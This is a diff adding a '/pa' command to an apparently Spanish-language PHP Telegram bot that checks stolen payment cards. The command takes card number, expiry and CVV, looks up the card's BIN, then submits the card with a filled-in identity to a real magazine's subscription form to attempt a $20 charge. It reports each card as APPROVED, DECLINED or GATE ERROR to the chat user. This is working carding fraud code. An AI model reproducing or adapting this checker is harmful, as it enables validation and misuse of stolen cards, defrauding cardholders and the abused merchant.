@@ -1471,7 +1471,223 @@ editMessage($chat_id,$respuesta,$id_text);
 }
 
 
-	
+
+
+elseif((strpos($message, "!pa") === 0)||(strpos($message, "/pa") === 0)||(strpos($message, ".pa") === 0)){
+
+$lista = substr($message, 4);
+$i     = explode("|", $lista);
+$cc    = $i[0];
+$mes   = $i[1];
+$ano  = $i[2];
+$cvv   = $i[3];
+
+$bin = substr($lista, 0, 6);
+
+
+////
+$num = "$cc$mes$ano$cvv";
+//-----------------------------------------------------//
+$verify = substr($cc, 16, 1);
+if($verify != ""){
+$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
+sendMessage($chat_id,$respuesta, $message_id);
+die();
+}
+
+if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+}else{
+$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /pa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !pa cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .pa cc|m|y|cvv\n";
+sendMessage($chat_id,$respuesta, $message_id);
+die();
+}
+
+
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+//----------------------------------------------------//
+
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$curl = curl_init('https://lookup.binlist.net/'.$bin.'');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+$result = curl_exec($curl);
+curl_close($curl);
+//---------------------------------------------//
+$bank = capture($result, '"bank": {"name": "', '"');
+$emoji = capture($result, '"emoji":"', '"');
+$alpha = strtoupper(capture($result, '"alpha2":"', '"'));
+$scheme = strtoupper(capture($result, '"scheme":"', '"'));
+$type = strtoupper(capture($result, '"type":"', '"'));
+$currency = capture($result, '"currency":"', '"');
+//---------------------------------------------//
+if (empty($bank)) {
+$bank = "Unavailable";
+}
+if (empty($emoji)) {
+$emoji = "Unavailable";
+}
+if (empty($alpha)) {
+$alpha = "Unavailable";
+}
+if (empty($scheme)) {
+$scheme = "Unavailable";
+}
+if (empty($type)) {
+$type = "Unavailable";
+}
+if (empty($currency)) {
+$currency = "Unavailable";
+}
+$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+$content = curl_exec($curl);
+curl_close($curl);
+$binna = json_decode($content,true);
+//---------------------------------------------//
+$level = $binna['category'];
+$brand = $binna['scheme'];
+$country = $binna['country']['name'];
+$type = $binna['type'];
+$bank = $binna['bank']['name'];
+$count = "".$country." - ".$alpha." ".$emoji."";
+if (empty($level)) {
+$level = "Unavailable";
+}
+if (empty($brand)) {
+$brand = "Unavailable";
+}
+if (empty($country)) {
+$country = "Unavailable";
+}
+if (empty($type)) {
+$type = "Unavailable";
+}
+if (empty($bank)) {
+$bank = "Unavailable";
+}
+if (empty($currency)) {
+$count = "Unavailable";
+}
+              ////RANDOM USER//
+$MV = ucwords(strtolower(trim($brand)));
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => [
+    '_cf_verify' => '17607b8bf8',
+    '_wp_http_referer' => '/index.php/subscribe/',
+    '_cf_frm_id' => 'CF6317ae143565f',
+    '_cf_frm_ct' => '1',
+    'cfajax' => 'CF6317ae143565f',
+    '_cf_cr_pst' => '335',
+    'twitter' => '',
+    'fld_1604923' => 'Canada',
+    'fld_3782878' => '1 year ($20) - 4 issues',
+    'fld_6223773' => 'First time subscription',
+    'fld_3249557' => '1',
+    'fld_7659764' => ''.$correo.'',
+    'fld_5990741' => ''.$cc.'',
+    'fld_1615852' => ''.$mes.' / '.$ano.'',
+    'fld_4133199' => ''.$cvv.'',
+    'fld_2356280' => ''.$MV.'',
+    'fld_950613' => ''.$nombre.'',
+    'fld_2278346' => ''.$apellido.'',
+    'fld_6787259' => ''.$telefono.'',
+    'fld_2041995' => 'Canada',
+    'fld_5232305' => ''.$direccion1.'',
+    'fld_4491871' => ''.$direccion1.'',
+    'fld_3911000' => ''.$ciudad.'',
+    'fld_2494407' => ''.$zip.'',
+    'fld_778305' => 'AZ',
+    'fld_4577367' => '20.00',
+    'fld_3144093' => 'click',
+    'fld_5757786' => '2024/09/05',
+    'fld_2545505' => '101204525',
+    'fld_6974264' => '100',
+    'instance' => '1',
+    'request' => 'https://panoramitalia.com/cf-api/CF6317ae143565f',
+    'formId' => 'CF6317ae143565f',
+    'postDisable' => '0',
+    'target' => '#caldera_notices_1',
+    'loadClass' => 'cf_processing',
+    'loadElement' => '_parent',
+    'hiderows' => 'true',
+    'action' => 'cf_process_ajax_submit',
+    'cfajax' => 'CF6317ae143565f',
+    'template' => '#cfajax_CF6317ae143565f-tmpl',
+  ],
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fpanoramitalia.com%2F%3Fwc-ajax%3Dget_refreshed_fragments',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
+    'Origin: https://panoramitalia.com',
+    'Referer: https://panoramitalia.com/index.php/subscribe/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$data = json_decode($response, true);
+$respo = strip_tags($data['html']);
+curl_close($curl);
+
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+if (empty($respo)) {
+   // echo "$result1\n";
+    $respo = "Error verification.";
+}
+
+// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
+
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $live = True;
+} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($result1, 'Pick up card - S') !== false) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $live = False;
+} else {
+        if ($respo === "Error verification.") {
+            // Ejecutar el código de error aquí
+            $respo = $response;
+        }
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$brand."\n➭ 𝚃𝚈𝙿𝙴: ".$type."\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."\n➭ 𝙱𝙰𝙽𝙺: ".$bank."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+    $live = False;
+}
+
+if ($live) {
+    //echo "$respuesta\n";
+    editMessage($chat_id, $respuesta, $id_text);
+} else {
+    //echo "$respuesta\n";
+    editMessage($chat_id, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+
+}
+
+
+
+
 elseif((strpos($message, "!nm") === 0)||(strpos($message, "/nm") === 0)||(strpos($message, ".nm") === 0)){
 
 $lista = substr($message, 4);
